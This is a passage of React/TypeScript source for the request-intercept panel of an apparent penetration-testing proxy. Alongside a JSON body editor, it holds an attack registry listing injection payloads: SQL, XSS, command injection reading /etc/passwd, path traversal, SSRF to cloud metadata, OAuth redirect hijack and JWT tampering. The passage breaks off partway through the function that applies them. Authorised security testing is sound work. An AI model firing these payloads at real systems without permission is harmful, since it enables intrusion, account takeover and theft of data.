import { useState, useEffect, useCallback, useRef, useMemo, Fragment } from 'react';
import { Pause, Play, ArrowRight, X, Shield, Zap, Globe, Eye, Code, FileText, Hash, ToggleLeft, ToggleRight, Copy, RefreshCw, Crosshair, Wifi, AlertTriangle, Server, KeyRound, Layers, Search, Unlink, UserX, ChevronDown, ChevronRight, Scan, CheckCircle, XCircle, Minus } from 'lucide-react';
import { useAppStore } from '../../stores';
import { notifyError } from '../../utils/notify';
import './Intercept.css';

interface QueuedRequest {
  id: string;
  method: string;
  url: string;
  host: string;
  raw: string;
  timestamp: string;
  isResponse: boolean;
  status?: number;
  rawResponse?: string;
}

interface ParsedHeader {
  key: string;
  value: string;
}

interface ParsedParam {
  key: string;
  value: string;
  source: string; // 'query', 'body', 'cookie'
}

function parseHeaders(raw: string): ParsedHeader[] {
  const headers: ParsedHeader[] = [];
  const lines = raw.split('\n');
  for (let i = 1; i < lines.length; i++) {
    const line = lines[i].trim();
    if (!line) break;
    const idx = line.indexOf(':');
    if (idx > 0) {
      headers.push({ key: line.slice(0, idx).trim(), value: line.slice(idx + 1).trim() });
    }
  }
  return headers;
}

function parseParams(raw: string, url: string): ParsedParam[] {
  const params: ParsedParam[] = [];

  try {
    const u = new URL(url.startsWith('http') ? url : 'http://x' + url);
    u.searchParams.forEach((v, k) => params.push({ key: k, value: v, source: 'query' }));
  } catch {}

  const bodyStart = raw.indexOf('\r\n\r\n') || raw.indexOf('\n\n');
  if (bodyStart > 0) {
    const body = raw.slice(bodyStart).trim();
    if (body && !body.startsWith('{') && !body.startsWith('<')) {
      body.split('&').forEach(pair => {
        const [k, v] = pair.split('=').map(s => {
          try { return decodeURIComponent(s); } catch { return s; }
        });
        if (k) params.push({ key: k, value: v || '', source: 'body' });
      });
    }
  }

  const lines = raw.split('\n');
  for (const line of lines) {
    if (line.toLowerCase().startsWith('cookie:')) {
      const cookies = line.slice(7).trim();
      cookies.split(';').forEach(c => {
        const [k, v] = c.trim().split('=');
        if (k) params.push({ key: k.trim(), value: (v || '').trim(), source: 'cookie' });
      });
    }
  }

  return params;
}

function toHex(text: string): string {
  const lines: string[] = [];
  const bytes = new TextEncoder().encode(text);
  for (let i = 0; i < bytes.length; i += 16) {
    const chunk = bytes.slice(i, i + 16);
    const hex = Array.from(chunk).map(b => b.toString(16).padStart(2, '0')).join(' ');
    const ascii = Array.from(chunk).map(b => b >= 32 && b < 127 ? String.fromCharCode(b) : '.').join('');
    const offset = i.toString(16).padStart(8, '0');
    lines.push(`${offset}  ${hex.padEnd(48)}  ${ascii}`);
  }
  return lines.join('\n');
}

function findHeaderEnd(raw: string): { idx: number; sepLen: number } {
  const crlf = raw.indexOf('\r\n\r\n');
  const lf = raw.indexOf('\n\n');
  if (crlf !== -1 && (lf === -1 || crlf <= lf)) return { idx: crlf, sepLen: 4 };
  if (lf !== -1) return { idx: lf, sepLen: 2 };
  return { idx: -1, sepLen: 0 };
}

function highlightHttp(raw: string) {
  if (!raw) return null;
  const { idx: headerEnd, sepLen } = findHeaderEnd(raw);
  const hasBody = headerEnd !== -1;
  const headPart = hasBody ? raw.slice(0, headerEnd) : raw;
  const bodyPart = hasBody ? raw.slice(headerEnd + sepLen) : '';
  const sepRaw = hasBody ? raw.slice(headerEnd, headerEnd + sepLen) : '';

  const lines = headPart.split('\n');
  const firstLine = lines[0];
  let firstLineJsx: React.ReactElement;
  if (firstLine.startsWith('HTTP/')) {
    const parts = firstLine.split(' ');
    firstLineJsx = (
      <span>
        <span className="hl-version">{parts[0]}</span>{' '}
        <span className={`hl-status s${parts[1]?.[0] || '2'}xx`}>{parts[1]}</span>{' '}
        <span className="hl-reason">{parts.slice(2).join(' ')}</span>
      </span>
    );
  } else {
    const parts = firstLine.split(' ');
    firstLineJsx = (
      <span>
        <span className="hl-method">{parts[0]}</span>{' '}
        <span className="hl-url">{parts[1]}</span>{' '}
        <span className="hl-version">{parts[2]}</span>
      </span>
    );
  }

  const headerJsx = lines.slice(1).map((line, i) => {
    const idx = line.indexOf(':');
    if (idx !== -1) {
      return (
        <Fragment key={i}>
          {'\n'}
          <span className="hl-hkey">{line.slice(0, idx)}</span>
          <span className="hl-hcolon">:</span>
          <span className="hl-hval">{line.slice(idx + 1)}</span>
        </Fragment>
      );
    }
    return <Fragment key={i}>{'\n'}{line}</Fragment>;
  });

  return (
    <>
      {firstLineJsx}
      {headerJsx}
      {hasBody && <span className="hl-body">{sepRaw}{bodyPart}</span>}
    </>
  );
}

// Auto pretty-print the body of an HTTP message if Content-Type is JSON and the
// body parses cleanly. Returns the raw unchanged if no transformation applies.
// Also updates Content-Length to match the new body length.
function autoPrettyJsonBody(raw: string): string {
  if (!raw) return raw;
  const { idx, sepLen } = findHeaderEnd(raw);
  if (idx === -1) return raw;
  const headers = raw.slice(0, idx);
  const body = raw.slice(idx + sepLen);
  const ctMatch = /^Content-Type:\s*([^\r\n]+)/im.exec(headers);
  const isJson = (ctMatch && /json/i.test(ctMatch[1])) || looksLikeJson(body);
  if (!isJson) return raw;
  const trimmed = body.trim();
  if (!trimmed) return raw;
  try {
    const parsed = JSON.parse(trimmed);
    const pretty = JSON.stringify(parsed, null, 2);
    if (pretty === trimmed) return raw;
    const newLen = new TextEncoder().encode(pretty).length;
    const clRegex = /^Content-Length:[^\r\n]*$/im;
    const newHeaders = clRegex.test(headers)
      ? headers.replace(clRegex, `Content-Length: ${newLen}`)
      : headers;
    return newHeaders + raw.slice(idx, idx + sepLen) + pretty;
  } catch {
    return raw;
  }
}

function replaceBody(raw: string, newBody: string): string {
  const { idx, sepLen } = findHeaderEnd(raw);
  if (idx === -1) return raw;
  let headers = raw.slice(0, idx);
  const newLen = new TextEncoder().encode(newBody).length;
  const clRegex = /^Content-Length:[^\r\n]*$/im;
  if (clRegex.test(headers)) {
    headers = headers.replace(clRegex, `Content-Length: ${newLen}`);
  }
  return headers + raw.slice(idx, idx + sepLen) + newBody;
}

function jsonType(v: any): 'object' | 'array' | 'string' | 'number' | 'boolean' | 'null' {
  if (v === null) return 'null';
  if (Array.isArray(v)) return 'array';
  return typeof v as any;
}

function looksLikeJson(body: string): boolean {
  const t = body.trim();
  return t.startsWith('{') || t.startsWith('[');
}

function setByPath(obj: any, path: (string | number)[], value: any): any {
  if (path.length === 0) return value;
  const [head, ...rest] = path;
  if (Array.isArray(obj)) {
    const next = obj.slice();
    next[head as number] = setByPath(obj[head as number], rest, value);
    return next;
  }
  return { ...obj, [head as string]: setByPath(obj[head as string], rest, value) };
}

function deleteByPath(obj: any, path: (string | number)[]): any {
  if (path.length === 0) return undefined;
  const [head, ...rest] = path;
  if (rest.length === 0) {
    if (Array.isArray(obj)) return obj.filter((_, i) => i !== (head as number));
    const next = { ...obj };
    delete next[head as string];
    return next;
  }
  return setByPath(obj, [head], deleteByPath(obj[head as any], rest));
}

function renameKeyAt(obj: any, parentPath: (string | number)[], oldKey: string, newKey: string): any {
  const doRename = (o: any) => {
    if (Array.isArray(o) || o === null || typeof o !== 'object') return o;
    const out: any = {};
    for (const k of Object.keys(o)) {
      if (k === oldKey) out[newKey] = o[k];
      else out[k] = o[k];
    }
    return out;
  };
  if (parentPath.length === 0) return doRename(obj);
  const parent = parentPath.reduce((a, p) => a[p as any], obj);
  return setByPath(obj, parentPath, doRename(parent));
}

function defaultForType(t: string): any {
  switch (t) {
    case 'string': return '';
    case 'number': return 0;
    case 'boolean': return false;
    case 'null': return null;
    case 'array': return [];
    case 'object': return {};
  }
  return '';
}

interface JsonBodyEditorProps {
  editedRaw: string;
  setEditedRaw: (v: string) => void;
  setEditedHeaders: (r: string) => void;
  addToast: (t: any) => void;
}

function JsonBodyEditor({ editedRaw, setEditedRaw, setEditedHeaders, addToast }: JsonBodyEditorProps) {
  const body = useMemo(() => {
    const { idx, sepLen } = findHeaderEnd(editedRaw);
    return idx === -1 ? '' : editedRaw.slice(idx + sepLen);
  }, [editedRaw]);

  const [tree, setTree] = useState<any>(undefined);
  const [parseError, setParseError] = useState<string | null>(null);
  const [collapsed, setCollapsed] = useState<Set<string>>(new Set());
  const [pretty, setPretty] = useState(true);
  const lastSerialized = useRef<string>('');

  useEffect(() => {
    if (body === lastSerialized.current) return;
    const t = body.trim();
    if (!t) {
      setTree(undefined);
      setParseError(null);
      return;
    }
    try {
      setTree(JSON.parse(t));
      setParseError(null);
    } catch (e: any) {
      setParseError(e?.message || String(e));
    }
  }, [body]);

  const treeRef = useRef<any>(tree);
  useEffect(() => { treeRef.current = tree; }, [tree]);

  const commit = useCallback((updaterOrValue: any) => {
    const newTree = typeof updaterOrValue === 'function'
      ? updaterOrValue(treeRef.current)
      : updaterOrValue;
    setTree(newTree);
    treeRef.current = newTree;
    const newBody = pretty ? JSON.stringify(newTree, null, 2) : JSON.stringify(newTree);
    lastSerialized.current = newBody;
    const newRaw = replaceBody(editedRaw, newBody);
    setEditedRaw(newRaw);
    setEditedHeaders(newRaw);
  }, [editedRaw, setEditedRaw, setEditedHeaders, pretty]);

  const togglePretty = () => {
    const next = !pretty;
    setPretty(next);
    if (tree !== undefined) {
      const newBody = next ? JSON.stringify(tree, null, 2) : JSON.stringify(tree);
      lastSerialized.current = newBody;
      const newRaw = replaceBody(editedRaw, newBody);
      setEditedRaw(newRaw);
      setEditedHeaders(newRaw);
    }
  };

  const togglePath = (key: string) => {
    setCollapsed(prev => {
      const next = new Set(prev);
      if (next.has(key)) next.delete(key);
      else next.add(key);
      return next;
    });
  };

  const initializeAsObject = () => commit({});
  const initializeAsArray = () => commit([]);

  if (!body.trim()) {
    return (
      <div className="json-editor-empty">
        <Layers size={28} />
        <span>No body in this request</span>
        <div className="json-editor-empty-actions">
          <button onClick={initializeAsObject}>+ Start with Object {'{}'}</button>
          <button onClick={initializeAsArray}>+ Start with Array []</button>
        </div>
      </div>
    );
  }

  if (parseError) {
    return (
      <div className="json-editor-empty">
        <AlertTriangle size={28} style={{ color: '#ff6b35' }} />
        <span>Body is not valid JSON</span>
        <code className="json-editor-error">{parseError}</code>
        <span className="intercept-empty-sub">Edit it in the Raw tab, or replace it:</span>
        <div className="json-editor-empty-actions">
          <button onClick={initializeAsObject}>Replace with {'{}'}</button>
          <button onClick={initializeAsArray}>Replace with []</button>
        </div>
      </div>
    );
  }

  if (tree === undefined) {
    return <div className="json-editor-empty"><Layers size={24} /><span>Loading…</span></div>;
  }

  return (
    <div className="json-editor-root">
      <div className="json-editor-toolbar">
        <span className="json-editor-title"><Layers size={12} /> JSON Body Editor</span>
        <button className="json-editor-toolbtn" onClick={togglePretty} title="Toggle pretty/minified">
          {pretty ? 'Minify' : 'Format'}
        </button>
        <button className="json-editor-toolbtn" onClick={() => {
          navigator.clipboard.writeText(JSON.stringify(tree, null, 2));
          addToast({ title: 'Copied', message: 'JSON body copied to clipboard', type: 'success' });
        }}>
          <Copy size={11} /> Copy
        </button>
        <span className="json-editor-spacer" />
        <span className="json-editor-size">{new TextEncoder().encode(JSON.stringify(tree)).length} bytes</span>
      </div>
      <div className="json-editor-tree">
        <JsonTreeNode
          path={[]}
          value={tree}
          keyName={null}
          parentType={null}
          collapsed={collapsed}
          togglePath={togglePath}
          onChange={(newVal) => commit(newVal)}
          onDelete={() => commit(Array.isArray(tree) ? [] : {})}
          onRename={() => {}}
        />
      </div>
    </div>
  );
}

interface JsonTreeNodeProps {
  path: (string | number)[];
  value: any;
  keyName: string | number | null;
  parentType: 'object' | 'array' | null;
  collapsed: Set<string>;
  togglePath: (key: string) => void;
  onChange: (newRoot: any) => void;
  onDelete: () => void;
  onRename: (newKey: string) => void;
  rootRef?: any;
}

const TYPE_LABEL: Record<string, string> = {
  string: 'str', number: 'num', boolean: 'bool', null: 'null', object: 'obj', array: 'arr',
};

function JsonTreeNode(props: JsonTreeNodeProps) {
  const { path, value, keyName, parentType, collapsed, togglePath, onChange } = props;
  const t = jsonType(value);
  const isContainer = t === 'object' || t === 'array';
  const pathKey = path.join('.') || 'root';
  const isCollapsed = collapsed.has(pathKey);
  const [keyDraft, setKeyDraft] = useState<string | null>(null);
  const [typeMenuOpen, setTypeMenuOpen] = useState(false);
  const [addMenuOpen, setAddMenuOpen] = useState(false);

  const setLocal = (newValue: any) => {
    onChange((prev: any) => setByPath(prev, path, newValue));
  };

  const changeType = (newType: string) => {
    setLocal(defaultForType(newType));
    setTypeMenuOpen(false);
  };

  const handleAddChild = (childType: string) => {
    if (t === 'array') {
      const newArr = [...(value as any[]), defaultForType(childType)];
      setLocal(newArr);
    } else if (t === 'object') {
      const obj = value as Record<string, any>;
      let newKey = 'field';
      let n = 1;
      while (newKey in obj) newKey = `field${n++}`;
      setLocal({ ...obj, [newKey]: defaultForType(childType) });
    }
    setAddMenuOpen(false);
  };

  const renderValueControl = () => {
    if (t === 'string') {
      return <input className="json-input json-input-str" value={value} onChange={e => setLocal(e.target.value)} spellCheck={false} />;
    }
    if (t === 'number') {
      return <input className="json-input json-input-num" type="number" value={value} onChange={e => {
        const v = e.target.value;
        if (v === '') { setLocal(0); return; }
        const n = Number(v);
        if (!isNaN(n)) setLocal(n);
      }} />;
    }
    if (t === 'boolean') {
      return (
        <button className={`json-bool-btn ${value ? 'true' : 'false'}`} onClick={() => setLocal(!value)}>
          {value ? 'true' : 'false'}
        </button>
      );
    }
    if (t === 'null') {
      return <span className="json-null">null</span>;
    }
    if (t === 'array') {
      return <span className="json-summary">[<span className="json-summary-count">{(value as any[]).length}</span>]</span>;
    }
    if (t === 'object') {
      return <span className="json-summary">{'{'}<span className="json-summary-count">{Object.keys(value).length}</span>{'}'}</span>;
    }
    return null;
  };

  const addTypes: { id: string; label: string }[] = [
    { id: 'string', label: 'String' },
    { id: 'number', label: 'Number' },
    { id: 'boolean', label: 'Boolean' },
    { id: 'null', label: 'Null' },
    { id: 'object', label: 'Object' },
    { id: 'array', label: 'Array' },
  ];

  return (
    <div className={`json-node json-type-${t}`}>
      <div className="json-row">
        {isContainer ? (
          <button className="json-collapse" onClick={() => togglePath(pathKey)} aria-label="toggle">
            {isCollapsed ? <ChevronRight size={12} /> : <ChevronDown size={12} />}
          </button>
        ) : <span className="json-collapse-spacer" />}

        {parentType === 'object' && keyName !== null ? (
          keyDraft !== null ? (
            <input
              className="json-input json-input-key"
              value={keyDraft}
              autoFocus
              onChange={e => setKeyDraft(e.target.value)}
              onBlur={() => {
                if (keyDraft && keyDraft !== keyName) {
                  onChange((root: any) => renameKeyAt(root, path.slice(0, -1), keyName as string, keyDraft));
                }
                setKeyDraft(null);
              }}
              onKeyDown={e => {
                if (e.key === 'Enter') (e.target as HTMLInputElement).blur();
                if (e.key === 'Escape') setKeyDraft(null);
              }}
              spellCheck={false}
            />
          ) : (
            <span className="json-key" onDoubleClick={() => setKeyDraft(keyName as string)} title="Double-click to rename">
              {String(keyName)}
            </span>
          )
        ) : parentType === 'array' && keyName !== null ? (
          <span className="json-idx">{keyName}</span>
        ) : (
          <span className="json-root-label">root</span>
        )}

        {parentType !== null && <span className="json-colon">:</span>}

        <span style={{ position: 'relative' }} onMouseLeave={() => setTypeMenuOpen(false)}>
          <button
            type="button"
            className={`json-type-badge ${t}`}
            onClick={() => setTypeMenuOpen(!typeMenuOpen)}
            title="Change type"
          >
            {TYPE_LABEL[t]}
          </button>
          {typeMenuOpen && (
            <div className="json-type-menu" onClick={e => e.stopPropagation()}>
              {Object.keys(TYPE_LABEL).map(typ => (
                <button
                  key={typ}
                  className={typ === t ? 'active' : ''}
                  onClick={() => changeType(typ)}
                >
                  {TYPE_LABEL[typ]}
                </button>
              ))}
            </div>
          )}
        </span>

        {renderValueControl()}

        <div className="json-row-actions">
          {isContainer && (
            <span className="json-add-menu-wrap" onMouseLeave={() => setAddMenuOpen(false)}>
              <button
                type="button"
                className="json-add-trigger"
                onClick={() => setAddMenuOpen(!addMenuOpen)}
                title="Add child"
              >
                +
              </button>
              {addMenuOpen && (
                <div className="json-add-menu" onClick={e => e.stopPropagation()}>
                  {addTypes.map(at => (
                    <button key={at.id} onClick={() => handleAddChild(at.id)}>
                      <span className={`json-type-mini json-type-badge ${at.id}`}>{TYPE_LABEL[at.id]}</span>
                      <span>{at.label}</span>
                    </button>
                  ))}
                </div>
              )}
            </span>
          )}
          {path.length > 0 && (
            <button className="json-del-btn" onClick={() => onChange((root: any) => deleteByPath(root, path))} title="Delete">
              <X size={12} />
            </button>
          )}
        </div>
      </div>

      {isContainer && !isCollapsed && (
        <div className="json-children">
          {t === 'object' ? (
            Object.keys(value).map((k) => (
              <JsonTreeNode
                key={k}
                path={[...path, k]}
                value={(value as any)[k]}
                keyName={k}
                parentType="object"
                collapsed={collapsed}
                togglePath={togglePath}
                onChange={onChange}
                onDelete={() => onChange((root: any) => deleteByPath(root, [...path, k]))}
                onRename={(newKey) => onChange((root: any) => renameKeyAt(root, path, k, newKey))}
              />
            ))
          ) : (
            (value as any[]).map((item, i) => (
              <JsonTreeNode
                key={i}
                path={[...path, i]}
                value={item}
                keyName={i}
                parentType="array"
                collapsed={collapsed}
                togglePath={togglePath}
                onChange={onChange}
                onDelete={() => onChange((root: any) => deleteByPath(root, [...path, i]))}
                onRename={() => {}}
              />
            ))
          )}
          {((t === 'object' && Object.keys(value).length === 0) ||
            (t === 'array' && (value as any[]).length === 0)) && (
            <div className="json-empty-container">empty — use the + buttons above to add entries</div>
          )}
        </div>
      )}
    </div>
  );
}

interface AttackDef {
  id: string;
  name: string;
  category: 'auth' | 'injection' | 'access' | 'server' | 'crypto' | 'client';
  risk: 'critical' | 'high' | 'medium' | 'low';
  desc: string;
  detectionKey: string; // maps to detectedAttacks key
  icon: React.ReactNode;
  hasConfig?: boolean;
}

const ATTACK_REGISTRY: AttackDef[] = [
  { id: 'contentTypeConverter', name: 'Content-Type Converter', category: 'injection', risk: 'high', desc: 'Convert form ↔ JSON (GitLab CVE-2023-7028)', detectionKey: 'contentTypeConverter', icon: <RefreshCw size={12} />, hasConfig: false },
  { id: 'jsonArrayInjection', name: 'JSON Array Injection', category: 'injection', risk: 'critical', desc: 'Scalar→array injection — GitLab $35K bounty', detectionKey: 'jsonArrayInjection', icon: <Crosshair size={12} />, hasConfig: true },
  { id: 'massAssignment', name: 'Mass Assignment', category: 'injection', risk: 'high', desc: 'Inject isAdmin, role, verified into JSON', detectionKey: 'massAssignment', icon: <Layers size={12} />, hasConfig: true },
  { id: 'prototypePollution', name: 'Prototype Pollution', category: 'injection', risk: 'critical', desc: 'Inject __proto__ and constructor payloads', detectionKey: 'prototypePollution', icon: <AlertTriangle size={12} />, hasConfig: false },
  { id: 'sqli', name: 'SQL Injection Probe', category: 'injection', risk: 'critical', desc: "Inject ' OR 1=1, UNION SELECT, SLEEP() payloads", detectionKey: 'sqli', icon: <AlertTriangle size={12} />, hasConfig: true },
  { id: 'xss', name: 'XSS Injection Probe', category: 'injection', risk: 'high', desc: '<script>alert(1)</script>, event handler payloads', detectionKey: 'xss', icon: <Code size={12} />, hasConfig: true },
  { id: 'ssti', name: 'SSTI (Template Injection)', category: 'injection', risk: 'critical', desc: '{{7*7}}, ${7*7} — Jinja2, Freemarker, ERB', detectionKey: 'ssti', icon: <Zap size={12} />, hasConfig: true },
  { id: 'cmdi', name: 'Command Injection', category: 'injection', risk: 'critical', desc: '; id, | whoami, $(cat /etc/passwd)', detectionKey: 'cmdi', icon: <AlertTriangle size={12} />, hasConfig: true },
  { id: 'crlf', name: 'CRLF / Response Splitting', category: 'injection', risk: 'high', desc: 'Inject %0d%0a into headers for XSS/redirect', detectionKey: 'crlf', icon: <Code size={12} />, hasConfig: false },
  { id: 'xxe', name: 'XXE Injection', category: 'injection', risk: 'critical', desc: 'XML entity injection for file read / SSRF', detectionKey: 'xxe', icon: <FileText size={12} />, hasConfig: false },
  { id: 'hpp', name: 'HTTP Param Pollution', category: 'injection', risk: 'medium', desc: 'Duplicate params — first-wins vs last-wins parser confusion', detectionKey: 'hpp', icon: <Hash size={12} />, hasConfig: true },
  { id: 'jsonDupeKeys', name: 'JSON Duplicate Keys', category: 'injection', risk: 'medium', desc: 'Duplicate JSON keys for parser confusion bypass', detectionKey: 'jsonDupeKeys', icon: <Layers size={12} />, hasConfig: true },
  { id: 'pathTraversal', name: 'Path Traversal / LFI', category: 'injection', risk: 'critical', desc: '../../etc/passwd, ..\\windows\\system32', detectionKey: 'pathTraversal', icon: <FileText size={12} />, hasConfig: true },
  { id: 'emailSwap', name: 'Email Swap', category: 'auth', risk: 'high', desc: 'Replace all emails with attacker address', detectionKey: 'emailSwap', icon: <UserX size={12} />, hasConfig: true },
  { id: 'tokenTamper', name: 'Token / Auth Tampering', category: 'auth', risk: 'high', desc: 'Tamper JWT, remove auth, alg:none attack', detectionKey: 'tokenTamper', icon: <AlertTriangle size={12} />, hasConfig: true },
  { id: 'oauthRedirect', name: 'OAuth redirect_uri Hijack', category: 'auth', risk: 'high', desc: 'Replace redirect_uri with attacker URL', detectionKey: 'oauthRedirect', icon: <Globe size={12} />, hasConfig: true },
  { id: 'roleEscalation', name: 'Role / Privilege Escalation', category: 'access', risk: 'critical', desc: 'Overwrite isAdmin, role, permission fields', detectionKey: 'roleEscalation', icon: <KeyRound size={12} />, hasConfig: true },
  { id: 'csrfRemoval', name: 'CSRF Token Removal', category: 'access', risk: 'high', desc: 'Strip all CSRF / anti-forgery tokens', detectionKey: 'csrfRemoval', icon: <Unlink size={12} />, hasConfig: false },
  { id: 'idorFuzz', name: 'IDOR Parameter Tampering', category: 'access', risk: 'high', desc: 'Modify numeric IDs (random, 0, -1, max)', detectionKey: 'idorFuzz', icon: <Hash size={12} />, hasConfig: true },
  { id: 'methodSwap', name: 'HTTP Method Swap', category: 'access', risk: 'medium', desc: 'GET→POST, POST→PUT to bypass ACLs', detectionKey: 'methodSwap', icon: <Layers size={12} />, hasConfig: true },
  { id: 'bypass403path', name: '403 Bypass (Path)', category: 'access', risk: 'high', desc: '/admin/. , //admin//, /%2e/admin mutations', detectionKey: 'bypass403path', icon: <KeyRound size={12} />, hasConfig: true },
  { id: 'bypass403headers', name: '403 Bypass (Headers)', category: 'access', risk: 'high', desc: 'X-Original-URL, X-Rewrite-URL header bypass', detectionKey: 'bypass403headers', icon: <Server size={12} />, hasConfig: false },
  { id: 'methodOverride', name: 'HTTP Method Override', category: 'access', risk: 'medium', desc: 'X-HTTP-Method-Override, _method param', detectionKey: 'methodOverride', icon: <Layers size={12} />, hasConfig: true },
  { id: 'corsTest', name: 'CORS Misconfiguration', category: 'access', risk: 'high', desc: 'Test Origin reflection for credential theft', detectionKey: 'corsTest', icon: <Globe size={12} />, hasConfig: true },
  { id: 'hostHeaderInjection', name: 'Host Header Injection', category: 'server', risk: 'high', desc: 'Password reset / cache poisoning via Host', detectionKey: 'hostHeaderInjection', icon: <Server size={12} />, hasConfig: true },
  { id: 'ipSpoofing', name: 'IP Spoofing Headers', category: 'server', risk: 'medium', desc: 'X-Forwarded-For, CF-Connecting-IP (8 headers)', detectionKey: 'ipSpoofing', icon: <Wifi size={12} />, hasConfig: true },
  { id: 'ssrfProbe', name: 'SSRF Probe', category: 'server', risk: 'critical', desc: 'Replace URL params with cloud metadata URLs', detectionKey: 'ssrfProbe', icon: <Globe size={12} />, hasConfig: true },
  { id: 'openRedirect', name: 'Open Redirect', category: 'server', risk: 'medium', desc: 'Replace redirect params with attacker URL', detectionKey: 'openRedirect', icon: <Globe size={12} />, hasConfig: true },
  { id: 'clickjacking', name: 'Clickjacking Test', category: 'client', risk: 'medium', desc: 'Check for missing X-Frame-Options / CSP', detectionKey: 'clickjacking', icon: <Eye size={12} />, hasConfig: false },
];

const CATEGORY_LABELS: Record<string, {label: string; color: string}> = {
  auth: { label: 'Auth', color: '#e74c3c' },
  injection: { label: 'Inject', color: '#f39c12' },
  access: { label: 'Access', color: '#3498db' },
  server: { label: 'Server', color: '#9b59b6' },
  client: { label: 'Client', color: '#1abc9c' },
  crypto: { label: 'Crypto', color: '#27ae60' },
};

const RISK_COLORS: Record<string, string> = { critical: '#ff4757', high: '#ff6b35', medium: '#ffa502', low: '#2ed573' };

interface AttackTablePanelProps {
  editedRaw: string;
  setEditedRaw: (v: string) => void;
  setEditedHeaders: (r: string) => void;
  setEditorTab: (t: any) => void;
  attackConfig: any;
  setAttackConfig: (v: any) => void;
  detectedAttacks: Record<string, boolean>;
  addToast: (t: any) => void;
  categoryFilter: string;
  setCategoryFilter: (v: string) => void;
  expandedAttack: string | null;
  setExpandedAttack: (v: string | null) => void;
  autoScanRunning: boolean;
  setAutoScanRunning: (v: boolean) => void;
  scanResults: {id: string; name: string; status: string; detail: string}[];
  setScanResults: (v: any) => void;
  currentUrl: string;
}

function AttackTablePanel(props: AttackTablePanelProps) {
  const { editedRaw, setEditedRaw, setEditedHeaders, setEditorTab, attackConfig, setAttackConfig, detectedAttacks, addToast, categoryFilter, setCategoryFilter, expandedAttack, setExpandedAttack, scanResults } = props;

  const riskOrder: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3 };
  const sortedAttacks = useMemo(() => {
    let filtered = ATTACK_REGISTRY;
    if (categoryFilter !== 'all') filtered = filtered.filter(a => a.category === categoryFilter);
    return [...filtered].sort((a, b) => {
      const aD = detectedAttacks[a.detectionKey] ? 0 : 1;
      const bD = detectedAttacks[b.detectionKey] ? 0 : 1;
      if (aD !== bD) return aD - bD;
      return riskOrder[a.risk] - riskOrder[b.risk];
    });
  }, [categoryFilter, detectedAttacks]);

  const detectedCount = Object.values(detectedAttacks).filter(Boolean).length;

  return (
    <div className="intercept-attack-panel">
      <div className="intercept-attack-header">
        <Shield size={14} /> Quick Attacks
        <div className="intercept-attack-filters">
          {['all', 'auth', 'injection', 'access', 'server', 'client'].map(cat => (
            <button key={cat} className={`intercept-cat-chip ${categoryFilter === cat ? 'active' : ''}`}
              style={cat !== 'all' && categoryFilter === cat ? { borderColor: CATEGORY_LABELS[cat]?.color } : {}}
              onClick={() => setCategoryFilter(cat)}>
              {cat === 'all' ? 'All' : CATEGORY_LABELS[cat]?.label}
            </button>
          ))}
        </div>
        {detectedCount > 0 && (
          <span className="intercept-attack-detect-count">
            <Search size={10} /> {detectedCount} detected
          </span>
        )}
      </div>

      <div className="intercept-attack-table-wrap">
        <table className="intercept-attack-table">
          <thead>
            <tr>
              <th style={{width: 28}}></th>
              <th style={{width: 52}}>Status</th>
              <th style={{width: 56}}>Cat</th>
              <th>Attack</th>
              <th style={{width: 56}}>Risk</th>
              <th style={{width: 64}}>Action</th>
            </tr>
          </thead>
          <tbody>
            {sortedAttacks.map(atk => {
              const detected = detectedAttacks[atk.detectionKey];
              const scanResult = scanResults.find(r => r.id === atk.id);
              const isExpanded = expandedAttack === atk.id;
              return (
                <Fragment key={atk.id}>
                  <tr className={`intercept-atk-row ${detected ? 'detected' : ''} ${isExpanded ? 'expanded' : ''}`}
                    onClick={() => setExpandedAttack(isExpanded ? null : atk.id)}>
                    <td className="intercept-atk-expand">
                      {atk.hasConfig ? (isExpanded ? <ChevronDown size={12} /> : <ChevronRight size={12} />) : <Minus size={10} style={{opacity:0.3}} />}
                    </td>
                    <td>
                      {scanResult ? (
                        scanResult.status === 'success' ? <CheckCircle size={13} style={{color: 'var(--green)'}} /> :
                        scanResult.status === 'fail' ? <XCircle size={13} style={{color: 'var(--red, #ff4757)'}} /> :
                        <Minus size={13} style={{opacity:0.4}} />
                      ) : detected ? (
                        <span className="intercept-attack-badge">MATCH</span>
                      ) : <span style={{opacity: 0.3, fontSize: 10}}>—</span>}
                    </td>
                    <td><span className="intercept-cat-label" style={{color: CATEGORY_LABELS[atk.category]?.color}}>{CATEGORY_LABELS[atk.category]?.label}</span></td>
                    <td className="intercept-atk-name">
                      {atk.icon} {atk.name}
                      <span className="intercept-atk-desc">{atk.desc}</span>
                    </td>
                    <td><span className="intercept-risk-dot" style={{background: RISK_COLORS[atk.risk]}}>{atk.risk[0].toUpperCase()}</span></td>
                    <td>
                      <button className={`intercept-atk-apply ${detected ? 'detected' : ''}`}
                        onClick={(e) => { e.stopPropagation(); applyAttack(atk.id); }}>
                        <Zap size={10} /> Run
                      </button>
                    </td>
                  </tr>
                  {isExpanded && atk.hasConfig && (
                    <tr className="intercept-atk-config-row">
                      <td colSpan={6}>
                        <div className="intercept-atk-config">
                          {renderConfig(atk.id)}
                        </div>
                      </td>
                    </tr>
                  )}
                </Fragment>
              );
            })}
          </tbody>
        </table>
      </div>

      {scanResults.length > 0 && (
        <div className="intercept-scan-results">
          <div className="intercept-scan-results-header">
            <Scan size={12} /> Scan Results
            <span className="intercept-scan-stats">
              {scanResults.filter(r => r.status === 'success').length} hits / {scanResults.length} tested
            </span>
          </div>
          {scanResults.map(r => (
            <div key={r.id} className={`intercept-scan-result ${r.status}`}>
              {r.status === 'success' ? <CheckCircle size={11} /> : r.status === 'fail' ? <XCircle size={11} /> : <Minus size={11} />}
              <span className="intercept-scan-name">{r.name}</span>
              <span className="intercept-scan-detail">{r.detail}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );

  function applyAttack(id: string) {
    switch (id) {
      case 'emailSwap': {
        const newRaw = editedRaw.replace(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/g, attackConfig.emailSwap);
        if (newRaw !== editedRaw) { setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw'); addToast({ title: 'Email Swap', message: 'Emails replaced.', type: 'success' }); }
        else addToast({ title: 'No emails', message: 'No emails found.', type: 'warning' });
        break;
      }
      case 'jsonArrayInjection': {
        const bodyStart = editedRaw.indexOf('\r\n\r\n');
        if (bodyStart < 0) { addToast({ title: 'No body', message: 'No body found.', type: 'warning' }); break; }
        const hdr = editedRaw.slice(0, bodyStart);
        let body = editedRaw.slice(bodyStart + 4).trim();
